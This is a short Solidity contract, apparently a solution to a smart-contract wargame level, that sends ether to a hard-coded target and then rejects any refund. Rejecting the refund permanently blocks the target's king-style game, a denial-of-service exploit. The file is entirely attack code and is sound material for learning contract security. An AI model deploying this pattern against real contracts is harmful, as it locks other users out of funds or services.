// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract KingKong {
    address owner = 0x1FDD0F41CA594B5518D3DE33AEdF0a41e24Ec8d6;

    function pwn() public {
        0xc62DE6587b83c1655c72A9ff82463FBAece9f9d4.call{
            value: 1200000000000000
        }("");
    }

    receive() external payable {
        require(msg.sender == owner);
    }
}
